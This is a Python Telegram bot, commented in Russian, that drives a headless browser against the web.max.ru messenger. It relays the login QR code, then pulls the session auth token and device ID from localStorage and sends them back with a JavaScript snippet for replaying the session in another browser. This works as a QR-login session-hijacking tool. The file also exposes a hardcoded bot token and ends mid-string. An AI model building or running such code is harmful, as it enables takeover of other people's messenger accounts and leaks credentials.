"""
Telegram бот для max.ru - РАБОЧАЯ ВЕРСИЯ
"""

import logging
import asyncio
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os
import time

# НОВЫЙ ТОКЕН
TOKEN = "8294429332:AAEQsLd2ZnGM0Z12arZjQZmVK38X1-tJEXY"
URL = "https://web.max.ru"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Хранилище сессий пользователей
user_sessions = {}

driver = None

def get_driver():
    global driver
    if not driver:
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920x1080')
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        driver = webdriver.Chrome(options=chrome_options)
    return driver

def check_authorization():
    """Проверяет, выполнен ли вход на сайт"""
    global driver
    
    try:
        has_auth = driver.execute_script("""
            let auth = localStorage.getItem('__oneme_auth');
            let deviceId = localStorage.getItem('__oneme_device_id');
            return auth !== null && deviceId !== null;
        """)
        return has_auth
    except:
        return False

def execute_command_and_get_result():
    """Выполняет команду и возвращает результат"""
    global driver
    
    try:
        result = driver.execute_script("""
            let deviceId = localStorage.getItem('__oneme_device_id');
            let auth = localStorage.getItem('__oneme_auth');
            
            let script = `
sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '${deviceId}');
localStorage.setItem('__oneme_auth', '${auth}');
window.location.reload();
            `;
            
            console.log(script);
            
            return {
                deviceId: deviceId,
                auth: auth,
                script: script,
                timestamp: new Date().toISOString()
            };
        """)
        return result
    except Exception as e:
        logger.error(f"Ошибка выполнения команды: {e}")
        return None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    await update.message.reply_text(
        "👋 **Бот для max.ru**\n\n"
        "🔹 **/qr** - получить скриншот с QR-кодом\n"
        "🔹 Отсканируй QR-код и войди на сайт\n"
        "🔹 Потом напиши **/check**\n"
        "🔹 Я проверю вход и выполню команду\n\n"
        "⚡️ Работает автоматически!",
        parse_mode='Markdown'
    )

async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение скриншота"""
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("🔄 Загружаю страницу...")
    
    try:
        driver = get_driver()
        
        # Загружаем страницу
        logger.info("Загружаю страницу...")
        driver.get(URL)
        
        # Ждем загрузки
        await msg.edit_text("⏳ Жду загрузки (15 секунд)...")
        time.sleep(15)
        
        # Делаем скриншот
        logger.info("Делаю скриншот...")
        screenshot = driver.get_screenshot_as_png()
        img_io = BytesIO(screenshot)
        img_io.name = "page.png"
        
        await msg.delete()
        
        # Отправляем скриншот
        await update.message.reply_photo(
            photo=InputFile(img_io, filename="page.png"),
            caption="📸 **Скриншот страницы**\n\n"
                    "1️⃣ Найди QR-код на скриншоте\n"
                    "2️⃣ Отсканируй его\n"
                    "3️⃣ Войди на сайт\n"
                    "4️⃣ Напиши **/check**",
            parse_mode='Markdown'
        )
        
        # Сохраняем сессию
        user_sessions[user_id] = {
            'status': 'waiting_scan'
        }
        
        logger.info(f"Скриншот отправлен пользователю {user_id}")
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {str(e)[:200]}")

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Проверка входа и выполнение команды"""
    user_id = str(update.effective_user.id)
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сначала используй /qr")
        return
    
    msg = await update.message.reply_text("🔄 Проверяю вход...")
    
    try:
        # Проверяем авторизацию
        if check_authorization():
            await msg.edit_text("✅ Вход выполнен! Выполняю команду...")
            
            # Выполняем команду
            result = execute_command_and_get_result()
            
            if result:
                # Форматируем результат
                result_text = f"""📊 **РЕЗУЛЬТАТ:**

**Device ID:** `{result.get('deviceId', 'не найден')}`

**Auth:** `{result.get('auth', 'не найден')}`

**Скрипт:**
```javascript
{result.get('script', '')}
